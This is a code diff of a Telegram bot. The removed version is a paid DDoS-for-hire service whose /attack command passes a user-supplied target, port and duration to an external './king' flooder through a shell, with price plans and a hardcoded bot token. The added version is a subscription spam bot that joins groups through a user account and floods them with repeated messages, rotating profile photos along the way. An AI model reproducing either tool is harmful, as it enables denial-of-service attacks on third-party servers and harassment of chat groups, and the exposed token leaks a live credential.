@@ -1,432 +1,274 @@
-#!/usr/bin/python3
+import asyncio
+import time
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
 
-import telebot
-import subprocess
-import requests
-import datetime
-import os
-from threading import Thread
-from flask import Flask
+# ---------------- CONFIGURATION ----------------
+API_ID = 1234567  # ضع هنا API_ID من my.telegram.org
+API_HASH = "your_api_hash_here"  # ضع هنا API_HASH
+BOT_TOKEN = "your_bot_token_here"  # توكن البوت
+MAIN_DEV_ID = 123456789  # آيدي المطور الأساسي
+MAIN_DEV_USERNAME = "your_username"  # يوزر المطور بدون @
+MUST_JOIN_CHANNEL = "your_channel"  # معرف قناة الاشتراك الإجباري بدون @
 
-# insert your Telegram bot token here
-bot = telebot.TeleBot('7900965753:AAGEuXB35uqeke536L394xq2U5u-17uF7kc')
+bot = Client("bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+user_account = Client("user_session", api_id=API_ID, api_hash=API_HASH)
 
-# Admin user IDs
-admin_id = ["7493679412"]
+# ---------------- DATA STORE ----------------
+devs_list = [MAIN_DEV_ID]
+custom_buttons = []  # الأزرار المضافة [{"text": "...", "url": "..."}]
+spam_photos = []     # قائمة الصور المرفوعة للتلغيم
+subscriptions = {}   # اشتراكات المستخدمين {user_id: expire_timestamp}
+user_states = {}
 
-# File to store allowed user IDs
-USER_FILE = "users.txt"
-
-# File to store command logs
-LOG_FILE = "log.txt"
-
-FREE_USER_FILE = "free_users.txt"
-free_user_credits = {}
-
-# Function to read user IDs from the file
-def read_users():
+# ---------------- HELPER FUNCTIONS ----------------
+async def check_sub(client, user_id):
     try:
-        with open(USER_FILE, "r") as file:
-            return file.read().splitlines()
-    except FileNotFoundError:
-        return []
-
-# Function to read free user IDs and their credits from the file
-def read_free_users():
-    try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
-    except FileNotFoundError:
-        pass
-
-# List to store allowed user IDs
-allowed_user_ids = read_users()
-
-# Function to log command to the file
-def log_command(user_id, target, port, time):
-    user_info = bot.get_chat(user_id)
-    if user_info.username:
-        username = "@" + user_info.username
-    else:
-        username = f"UserID: {user_id}"
-
-    with open(LOG_FILE, "a") as file:
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
-
-# Function to clear logs
-def clear_logs():
-    try:
-        with open(LOG_FILE, "r+") as file:
-            if file.read() == "":
-                response = "Logs are already cleared. No data found ❌."
-            else:
-                file.truncate(0)
-                response = "Logs cleared successfully ✅"
-    except FileNotFoundError:
-        response = "No logs found to clear."
-    return response
-
-# Function to record command logs
-def record_command_logs(user_id, command, target=None, port=None, time=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target:
-        log_entry += f" | Target: {target}"
-    if port:
-        log_entry += f" | Port: {port}"
-    if time:
-        log_entry += f" | Time: {time}"
-
-    with open(LOG_FILE, "a") as file:
-        file.write(log_entry + "\n")
-
-user_approval_expiry = {}
-
-# Function to calculate remaining approval time
-def get_remaining_approval_time(user_id):
-    expiry_date = user_approval_expiry.get(user_id)
-    if expiry_date:
-        remaining_time = expiry_date - datetime.datetime.now()
-        if remaining_time.days < 0:
-            return "Expired"
-        else:
-            return str(remaining_time)
-    else:
-        return "N/A"
-
-# Function to add or update user approval expiry date
-def set_approval_expiry_date(user_id, duration, time_unit):
-    current_time = datetime.datetime.now()
-    if time_unit == "hour" or time_unit == "hours":
-        expiry_date = current_time + datetime.timedelta(hours=duration)
-    elif time_unit == "day" or time_unit == "days":
-        expiry_date = current_time + datetime.timedelta(days=duration)
-    elif time_unit == "week" or time_unit == "weeks":
-        expiry_date = current_time + datetime.timedelta(weeks=duration)
-    elif time_unit == "month" or time_unit == "months":
-        expiry_date = current_time + datetime.timedelta(days=30 * duration)
-    else:
+        member = await client.get_chat_member(f"@{MUST_JOIN_CHANNEL}", user_id)
+        return member.status in ["member", "administrator", "creator"]
+    except Exception:
         return False
 
-    user_approval_expiry[user_id] = expiry_date
-    return True
+def is_subscribed_user(user_id):
+    if user_id in devs_list:
+        return True
+    expire_time = subscriptions.get(user_id, 0)
+    return time.time() < expire_time
 
-# Command handler for adding a user with approval time
-@bot.message_handler(commands=['add'])
-def add_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) > 2:
-            user_to_add = command[1]
-            duration_str = command[2]
+def build_main_keyboard(user_id):
+    buttons = []
+    # الأزرار المخصصة المضافة من قبل المطور
+    for btn in custom_buttons:
+        buttons.append([InlineKeyboardButton(btn["text"], url=btn["url"])])
+    
+    # زر المطور الأساسي
+    buttons.append([InlineKeyboardButton("👨‍💻 المطور", url=f"https://t.me/{MAIN_DEV_USERNAME}")])
+    
+    # لوحة المطورين
+    if user_id in devs_list:
+        buttons.append([InlineKeyboardButton("⚙️ لوحة المطور", callback_data="dev_panel")])
+        
+    return InlineKeyboardMarkup(buttons)
 
+async def rotate_photo_if_needed(msg_count):
+    """تغيير صورة الحساب كل 10 رسائل"""
+    if spam_photos and msg_count > 0 and msg_count % 10 == 0:
+        # اختيار صورة من القائمة بناءً على التكرار
+        photo_index = (msg_count // 10) % len(spam_photos)
+        try:
+            await user_account.set_profile_photo(photo=spam_photos[photo_index])
+        except Exception as e:
+            print(f"خطأ في تغيير الصورة: {e}")
+
+# ---------------- START COMMAND ----------------
+@bot.on_message(filters.command("start") & filters.private)
+async def start_handler(client: Client, message: Message):
+    user_id = message.from_user.id
+    
+    if not await check_sub(client, user_id):
+        await message.reply_text(f"⚠️ يجب عليك الاشتراك في القناة أولاً لاستخدام البوت:\n@{MUST_JOIN_CHANNEL}")
+        return
+
+    await message.reply_text(
+        "أهلاً بك في البوت!\n\n"
+        "• أرسل كلمة **تلغيم** للبدء بعملية التكرار.\n"
+        "• أرسل كلمة **المجموعات** لإدارة وإرسال رسائل للمجموعات المنضم لها الحساب.",
+        reply_markup=build_main_keyboard(user_id)
+    )
+
+# ---------------- USER SPAM & GROUPS ----------------
+@bot.on_message(filters.text == "تلغيم" & filters.private)
+async def start_spam(client: Client, message: Message):
+    user_id = message.from_user.id
+    if not is_subscribed_user(user_id):
+        await message.reply_text("❌ ليس لديك اشتراك فعال لاستخدام البوت. تواصل مع المطور لتفعيل الاشتراك.")
+        return
+
+    user_states[user_id] = {"step": "wait_link"}
+    await message.reply_text("ارسل رابط المجموعه:")
+
+@bot.on_message(filters.text == "المجموعات" & filters.private)
+async def show_groups_to_user(client: Client, message: Message):
+    user_id = message.from_user.id
+    if not is_subscribed_user(user_id):
+        await message.reply_text("❌ ليس لديك اشتراك فعال لاستخدام هذه الميزة.")
+        return
+
+    buttons = []
+    async for dialog in user_account.get_dialogs():
+        if dialog.chat.type.value in ["group", "supergroup"]:
+            buttons.append([InlineKeyboardButton(dialog.chat.title, callback_data=f"user_select_grp_{dialog.chat.id}")])
+
+    buttons.append([InlineKeyboardButton("➕ إضافة مجموعة", callback_data="user_add_group")])
+    await message.reply_text("اختر مجموعة للإرسال إليها:", reply_markup=InlineKeyboardMarkup(buttons))
+
+@bot.on_callback_query(filters.regex(r"^user_select_grp_"))
+async def user_select_group(client, callback_query):
+    group_id = int(callback_query.data.split("_")[3])
+    user_id = callback_query.from_user.id
+    user_states[user_id] = {"step": "user_wait_msg", "target_group": group_id}
+    await callback_query.message.reply_text("أرسل الحرف أو الكلمة المراد إرسالها (مثال: ا):")
+
+# ---------------- MESSAGE HANDLER ----------------
+@bot.on_message(filters.private & ~filters.me)
+async def handle_private_messages(client: Client, message: Message):
+    user_id = message.from_user.id
+    text = message.text
+    state_data = user_states.get(user_id, {})
+    state = state_data.get("step")
+
+    # --- معالجة إعدادات المطور ---
+    if user_id in devs_list:
+        if state == "wait_dev_photo" and message.photo:
+            photo_path = await message.download()
+            spam_photos.append(photo_path)
+            user_states[user_id] = {}
+            await message.reply_text(f"✅ تم إضافة الصورة! إجمالي الصور المتاحة للتغيير التلقائي: {len(spam_photos)}")
+            return
+
+        if state == "wait_add_dev":
             try:
-                duration = int(duration_str[:-4])
-                if duration <= 0:
-                    raise ValueError
-                time_unit = duration_str[-4:].lower()
-                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
-                    raise ValueError
+                new_dev_id = int(text)
+                devs_list.append(new_dev_id)
+                await message.reply_text(f"✅ تم إضافة المطور بنجاح: `{new_dev_id}`")
             except ValueError:
-                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
-                bot.reply_to(message, response)
-                return
+                await message.reply_text("❌ يرجى إرسال آيدي عددي صحيح.")
+            user_states[user_id] = {}
+            return
 
-            if user_to_add not in allowed_user_ids:
-                allowed_user_ids.append(user_to_add)
-                with open(USER_FILE, "a") as file:
-                    file.write(f"{user_to_add}\n")
-                if set_approval_expiry_date(user_to_add, duration, time_unit):
-                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
-                else:
-                    response = "Failed to set approval expiry date. Please try again later."
-            else:
-                response = "User already exists 🤦‍♂️."
-        else:
-            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
-    else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @XX7X6."
+        if state == "wait_sub_id":
+            user_states[user_id] = {"step": "wait_sub_days", "sub_target": int(text)}
+            await message.reply_text("أدخل عدد أيام الاشتراك (مثال: 30):")
+            return
 
-    bot.reply_to(message, response)
+        if state == "wait_sub_days":
+            target = state_data.get("sub_target")
+            days = int(text)
+            expire_timestamp = time.time() + (days * 86400)
+            subscriptions[target] = expire_timestamp
+            user_states[user_id] = {}
+            await message.reply_text(f"✅ تم تفعيل الاشتراك للمستخدم `{target}` لمدة {days} يوم.")
+            return
 
-# Command handler for retrieving user info
-@bot.message_handler(commands=['myinfo'])
-def get_user_info(message):
-    user_id = str(message.chat.id)
-    user_info = bot.get_chat(user_id)
-    username = user_info.username if user_info.username else "N/A"
-    user_role = "Admin" if user_id in admin_id else "User"
-    remaining_time = get_remaining_approval_time(user_id)
-    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
-    bot.reply_to(message, response, parse_mode="HTML")
+        if state == "wait_button_text":
+            user_states[user_id] = {"step": "wait_button_url", "btn_text": text}
+            await message.reply_text("أرسل رابط الزر (URL):")
+            return
 
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) > 1:
-            user_to_remove = command[1]
-            if user_to_remove in allowed_user_ids:
-                allowed_user_ids.remove(user_to_remove)
-                with open(USER_FILE, "w") as file:
-                    for user_id in allowed_user_ids:
-                        file.write(f"{user_id}\n")
-                response = f"User {user_to_remove} removed successfully 👍."
-            else:
-                response = f"User {user_to_remove} not found in the list ❌."
-        else:
-            response = '''Please Specify A User ID to Remove.
-✅ Usage: /remove <userid>😘'''
-    else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @XX7X6."
+        if state == "wait_button_url":
+            btn_text = state_data.get("btn_text")
+            custom_buttons.append({"text": btn_text, "url": text})
+            user_states[user_id] = {}
+            await message.reply_text(f"✅ تم إضافة الزر الشفاف [{btn_text}] بنجاح!")
+            return
 
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['clearlogs'])
-def clear_logs_command(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
+    # --- معالجة طلبات إرسال الرسائل للمستخدمين والمطورين ---
+    if state == "wait_link":
         try:
-            with open(LOG_FILE, "r+") as file:
-                log_content = file.read()
-                if log_content.strip() == "":
-                    response = "Logs are already cleared. No data found ❌."
-                else:
-                    file.truncate(0)
-                    response = "Logs Cleared Successfully ✅"
-        except FileNotFoundError:
-            response = "Logs are already cleared ❌."
-    else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @XX7X6."
-    bot.reply_to(message, response)
+            chat = await user_account.join_chat(text)
+            chat_id = chat.id
+        except Exception:
+            chat_id = text
+        user_states[user_id] = {"step": "wait_count", "chat_id": chat_id}
+        await message.reply_text("ارسل عدد التلغيم (من 1 إلى 100):")
 
-@bot.message_handler(commands=['clearusers'])
-def clear_users_command(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        try:
-            with open(USER_FILE, "r+") as file:
-                log_content = file.read()
-                if log_content.strip() == "":
-                    response = "USERS are already cleared. No data found ❌."
-                else:
-                    file.truncate(0)
-                    response = "users Cleared Successfully ✅"
-        except FileNotFoundError:
-            response = "users are already cleared ❌."
-    else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @XX7X6."
-    bot.reply_to(message, response)
+    elif state == "wait_count":
+        if not text.isdigit() or not (1 <= int(text) <= 100):
+            await message.reply_text("الرجاء إدخال عدد بين 1 و 100.")
+            return
+        
+        count = int(text)
+        chat_id = state_data.get("chat_id")
+        await message.reply_text(f"⏳ جاري بدء الإرسال ({count} رسالة)...")
 
-@bot.message_handler(commands=['allusers'])
-def show_all_users(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        try:
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                if user_ids:
-                    response = "Authorized Users:\n"
-                    for user_id in user_ids:
-                        try:
-                            user_info = bot.get_chat(int(user_id))
-                            username = user_info.username
-                            response += f"- @{username} (ID: {user_id})\n"
-                        except Exception as e:
-                            response += f"- User ID: {user_id}\n"
-                else:
-                    response = "No data found ❌"
-        except FileNotFoundError:
-            response = "No data found ❌"
-    else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @XX7X6."
-    bot.reply_to(message, response)
+        for i in range(1, count + 1):
+            await user_account.send_message(chat_id, "ا")
+            await rotate_photo_if_needed(i)  # تغيير الصورة كل 10 رسائل
+            await asyncio.sleep(0.3)
 
-@bot.message_handler(commands=['logs'])
-def show_recent_logs(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-            try:
-                with open(LOG_FILE, "rb") as file:
-                    bot.send_document(message.chat.id, file)
-            except FileNotFoundError:
-                response = "No data found ❌."
-                bot.reply_to(message, response)
-        else:
-            response = "No data found ❌"
-            bot.reply_to(message, response)
-    else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @XX7X6."
-        bot.reply_to(message, response)
+        user_states[user_id] = {}
+        await message.reply_text("✅ اكتملت عملية التلغيم بنجاح!")
 
-def start_attack_reply(message, target, port, time):
-    user_info = message.from_user
-    username = user_info.username if user_info.username else user_info.first_name
+    elif state == "user_wait_msg":
+        user_states[user_id]["dev_text"] = text
+        user_states[user_id]["step"] = "user_wait_count"
+        await message.reply_text("أدخل عدد مرات التكرار (من 1 إلى 100):")
 
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🚀🚀\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- @XX7X6 KA KALA JADU"
-    bot.reply_to(message, response)
+    elif state == "user_wait_count":
+        if not text.isdigit() or not (1 <= int(text) <= 100):
+            await message.reply_text("الرجاء إدخال رقم بين 1 و 100.")
+            return
 
-bgmi_cooldown = {}
-COOLDOWN_TIME =0
+        count = int(text)
+        target_group = state_data.get("target_group")
+        msg_text = state_data.get("dev_text")
 
-@bot.message_handler(commands=['attack'])
-def handle_attack(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        if user_id not in admin_id:
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
-                response = "You Are On Cooldown ❌. Please Wait 0sec Before Running The /attack Command Again."
-                bot.reply_to(message, response)
-                return
-            bgmi_cooldown[user_id] = datetime.datetime.now()
+        await message.reply_text(f"⏳ جاري إرسال الرسائل ({count} مرة)...")
 
-        command = message.text.split()
-        if len(command) == 4:
-            target = command[1]
-            port = int(command[2])
-            time = int(command[3])
-            if time > 1000:
-                response = "Error: Time interval must be less than 1000."
-            else:
-                record_command_logs(user_id, '/attack', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)
-                full_command = f"./king {target} {port} {time} 100"
-                subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
-        else:
-            response = "✅ Usage :- /attack <target> <port> <time>"
-    else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. DM TO BUY ACCESS:- @XX7X6")
+        for i in range(1, count + 1):
+            await user_account.send_message(target_group, msg_text)
+            await rotate_photo_if_needed(i)  # تغيير الصورة كل 10 رسائل
+            await asyncio.sleep(0.3)
 
-    bot.reply_to(message, response)
+        user_states[user_id] = {}
+        await message.reply_text("✅ تم إكمال الإرسال بنجاح!")
 
-@bot.message_handler(commands=['mylogs'])
-def show_command_logs(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        try:
-            with open(LOG_FILE, "r") as file:
-                command_logs = file.readlines()
-                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
-                if user_logs:
-                    response = "Your Command Logs:\n" + "".join(user_logs)
-                else:
-                    response = "❌ No Command Logs Found For You ❌."
-        except FileNotFoundError:
-            response = "No command logs found."
-    else:
-        response = "You Are Not Authorized To Use This Command 😡."
+# ---------------- DEVELOPER PANEL CALLBACKS ----------------
+@bot.on_callback_query(filters.regex("dev_panel"))
+async def dev_panel_handler(client, callback_query):
+    if callback_query.from_user.id not in devs_list:
+        return
 
-    bot.reply_to(message, response)
+    keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("➕ إضافة مطور", callback_data="dev_add_dev")],
+        [InlineKeyboardButton("💳 إضافة اشتراك لمستخدم", callback_data="dev_add_sub")],
+        [InlineKeyboardButton("🖼️ إضافة صورة تلغيم", callback_data="dev_add_photo")],
+        [InlineKeyboardButton("🔘 إضافة زر شفاف", callback_data="dev_add_button")],
+        [InlineKeyboardButton("👨‍💻 حساب المطور الأساسي", url=f"https://t.me/{MAIN_DEV_USERNAME}")]
+    ])
+    await callback_query.message.edit_text("⚙️ **لوحة التحكم المتقدمة للمطور**", reply_markup=keyboard)
 
-@bot.message_handler(commands=['help'])
-def show_help(message):
-    help_text ='''🤖 Available commands:
-💥 /attack : Method For Bgmi Servers.
-💥 /rules : Please Check Before Use!!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
-💥 /myinfo : TO Check Your WHOLE INFO.
+@bot.on_callback_query(filters.regex("dev_add_dev"))
+async def cb_add_dev(client, callback_query):
+    if callback_query.from_user.id != MAIN_DEV_ID:
+        await callback_query.answer("⚠️ المطور الأساسي فقط يمكنه إضافة مطورين.", show_alert=True)
+        return
+    user_states[callback_query.from_user.id] = {"step": "wait_add_dev"}
+    await callback_query.message.reply_text("أرسل آيدي المطور الجديد:")
 
-🤖 To See Admin Commands:
-💥 /admincmd : Shows All Admin Commands.
+@bot.on_callback_query(filters.regex("dev_add_sub"))
+async def cb_add_sub(client, callback_query):
+    if callback_query.from_user.id not in devs_list:
+        return
+    user_states[callback_query.from_user.id] = {"step": "wait_sub_id"}
+    await callback_query.message.reply_text("أرسل آيدي المستخدم المراد تفعيل الاشتراك له:")
 
-Buy From :- @XX7X6
-Official Channel :- https://t.me/W_3_VV
-'''
-    bot.reply_to(message, help_text)
+@bot.on_callback_query(filters.regex("dev_add_photo"))
+async def cb_add_photo(client, callback_query):
+    if callback_query.from_user.id not in devs_list:
+        return
+    user_states[callback_query.from_user.id] = {"step": "wait_dev_photo"}
+    await callback_query.message.reply_text("قم بإرسال الصورة الآن ليتم إضافتها إلى قائمة التبديل التلقائي:")
 
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴇss.
-🤖Try To Run This Command : /help
-✅BUY :- @XX7X6'''
-    bot.reply_to(message, response)
+@bot.on_callback_query(filters.regex("dev_add_button"))
+async def cb_add_button(client, callback_query):
+    if callback_query.from_user.id not in devs_list:
+        return
+    user_states[callback_query.from_user.id] = {"step": "wait_button_text"}
+    await callback_query.message.reply_text("أرسل نص الزر الشفاف الذي تريد ظهوره في البوت:")
 
-@bot.message_handler(commands=['rules'])
-def welcome_rules(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules ⚠️:
+@bot.on_callback_query(filters.regex("user_add_group"))
+async def cb_add_group(client, callback_query):
+    await callback_query.message.reply_text("أرسل رابط المجموعة للانضمام إليها عبر الحساب:")
+    user_states[callback_query.from_user.id] = {"step": "wait_link"}
 
-1. Dont Run Too Many Attacks!! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
-3. MAKE SURE YOU JOINED https://t.me/W_3_VV OTHERWISE NOT WORK
-4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['plan'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos!!:
-
-Vip 🌟 :
--> Attack Time : 300 (S)
-> After Attack Limit : 10 sec
--> Concurrents Attack : 5
-
-Pr-ice List💸 :
-3 day--> 200
-Week-->300 Rs
-Month-->500 Rs
-'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['admincmd'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
-
-💥 /add <userId> : Add a User.
-💥 /remove <userid> Remove a User.
-💥 /allusers : Authorised Users Lists.
-💥 /logs : All Users Logs.
-💥 /broadcast : Broadcast a Message.
-💥 /clearlogs : Clear The Logs File.
-💥 /clearusers : Clear The USERS File.
-'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast_message(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split(maxsplit=1)
-        if len(command) > 1:
-            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                for user_id in user_ids:
-                    try:
-                        bot.send_message(user_id, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast Message Sent Successfully To All Users 👍."
-        else:
-            response = "🤖 Please Provide A Message To Broadcast."
-    else:
-        response = "Only Admin Can Run This Command 😡."
-
-    bot.reply_to(message, response)
-
-app = Flask('')
-@app.route('/')
-def home(): return "Bot is running"
-def run(): app.run(host='0.0.0.0',port=int(os.environ.get('PORT', 10000)))
-Thread(target=run).start()
+# ---------------- RUN BOT ----------------
+async def main():
+    await bot.start()
+    await user_account.start()
+    print("🤖 البوت والحساب الشخصي يعملان بكامل الخصائص!")
+    await asyncio.Event().wait()
 
 if __name__ == "__main__":
-    bot.delete_webhook()
-    bot.infinity_polling(skip_pending=True)
-    
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(main())
